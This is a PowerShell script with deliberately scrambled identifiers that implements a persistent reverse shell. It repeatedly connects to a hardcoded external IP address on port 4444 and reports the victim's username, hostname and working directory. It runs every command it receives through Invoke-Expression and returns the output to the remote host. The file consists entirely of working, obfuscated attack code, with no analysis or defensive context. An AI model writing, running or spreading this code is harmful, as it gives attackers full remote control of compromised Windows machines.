class hzyyOqyklaIWPoq {
    
    [string]$mCOxlFsfaLgyYnqIWyFmA = "93.49.240.195"
    [int]$jjSBdYQAMi = 4444

    $VonDIJVB
    $zUADQ
    $INlzxemvRZLpCRKNwyWx
    $luRwTFk
    $fvstccbLQrhLJdXSR
    $LtVdTviednYR
    [int]$MGIDTMcAIqBydmL = 50*1024

    HzWff() {
        $this.zUADQ = $false
        while ($true) {
            try {
                $this.zUADQ = New-Object Net.Sockets.TcpClient($this.mCOxlFsfaLgyYnqIWyFmA, $this.jjSBdYQAMi)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.GsXOLQXwpYKdcXFI()
    }

    GsXOLQXwpYKdcXFI() {
        $this.VonDIJVB = $this.zUADQ.GetStream()
        $this.luRwTFk = New-Object Byte[] $this.MGIDTMcAIqBydmL
        $this.LtVdTviednYR = New-Object Text.UTF8Encoding
        $this.INlzxemvRZLpCRKNwyWx = New-Object IO.StreamWriter($this.VonDIJVB, [Text.Encoding]::UTF8, $this.MGIDTMcAIqBydmL)
        $this.fvstccbLQrhLJdXSR = New-Object System.IO.StreamReader($this.VonDIJVB)
        $this.INlzxemvRZLpCRKNwyWx.AutoFlush = $true
    }

    EUHDLAKpYmAG() {
        $this.HzWff()
        $this.PTWNuNCjJnenyjamRwGf()
    }

    YYzGRAmKprPIi($phQvOYVAE) {
        try {
            [byte[]]$ZsTurrDUPsdNvlK = [text.Encoding]::Ascii.GetBytes($phQvOYVAE)
            $this.INlzxemvRZLpCRKNwyWx.Write($ZsTurrDUPsdNvlK, 0, $ZsTurrDUPsdNvlK.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.EUHDLAKpYmAG()
        }
    }

    [string] WCPBASPmxGE() {
        try {
            $znZNhkBKoGgyCNVTQAZygF = $this.VonDIJVB.Read($this.luRwTFk, 0, $this.MGIDTMcAIqBydmL)    
            $IwsDJobVXAbVMqYo = ($this.LtVdTviednYR.GetString($this.luRwTFk, 0, $znZNhkBKoGgyCNVTQAZygF))
            return $IwsDJobVXAbVMqYo
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.EUHDLAKpYmAG()
            return ""
        }
    }

    [string] RioNPMwHXarSYJLKpEUkqK($XYnvAQcia) {
        Write-Host $XYnvAQcia
        try { 
            $lIZfPgqwXcvPYSnsxQuFX = Invoke-Expression $XYnvAQcia | Out-String
        }
        catch {
            $erjSJzgGhdOZNVOUkzBxwW = $_.Exception
            $UEtDHspzvgeYqYfyYGJdZVZ = $_.Message
            $lIZfPgqwXcvPYSnsxQuFX = "`n$_`n"
        }
        return $lIZfPgqwXcvPYSnsxQuFX
    }

    [string] uSvQQXYjcYfjGphOCBBeTJBD() {
        $KDJoFxRnUjhmzfvIhn = [Environment]::UserName
        $WwerhfUQvbgJC = [System.Net.Dns]::GetHostName()
        $wnVYEheaZDDITt = Get-Location
        return "$KDJoFxRnUjhmzfvIhn@$WwerhfUQvbgJC [$wnVYEheaZDDITt]~$ "
    }

    PTWNuNCjJnenyjamRwGf() {
        while ($this.zUADQ.Connected) {
            $this.YYzGRAmKprPIi($this.uSvQQXYjcYfjGphOCBBeTJBD())         
            $IwsDJobVXAbVMqYo = $this.WCPBASPmxGE()
            $lIZfPgqwXcvPYSnsxQuFX = "`n"
            if ([string]::IsNullOrEmpty($IwsDJobVXAbVMqYo)) {
                continue
            }
            $lIZfPgqwXcvPYSnsxQuFX = $this.RioNPMwHXarSYJLKpEUkqK($IwsDJobVXAbVMqYo)
            $this.YYzGRAmKprPIi($lIZfPgqwXcvPYSnsxQuFX + "`n")
            $this.VonDIJVB.Flush()
        }
        $this.zUADQ.Close()
        $this.EUHDLAKpYmAG()
    } 
}

$fzlTdxfolukx = [hzyyOqyklaIWPoq]::new()
$fzlTdxfolukx.EUHDLAKpYmAG()
